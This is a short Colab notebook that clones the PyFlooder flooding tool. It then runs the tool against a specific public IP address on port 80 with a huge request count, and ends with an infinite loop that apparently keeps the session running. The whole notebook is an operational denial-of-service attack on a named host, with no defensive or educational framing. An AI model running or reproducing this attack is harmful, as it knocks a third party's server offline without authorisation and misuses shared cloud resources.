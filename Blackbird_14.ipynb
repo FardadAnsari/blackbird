{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Blackbird_14.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "iz5RxHi6mKzz"
      },
      "source": [
        "!git clone https://github.com/D4Vinci/PyFlooder.git"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "4aw5xx_wcvej"
      },
      "source": [
        "cd PyFlooder/"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "7DXyMK7cm-F2"
      },
      "source": [
        "!python pyflooder.py 176.9.16.251  80 10000000000000000"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "while True:\n",
        "  print(\"End\")"
      ],
      "metadata": {
        "id": "KgYPBRnEre5f"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}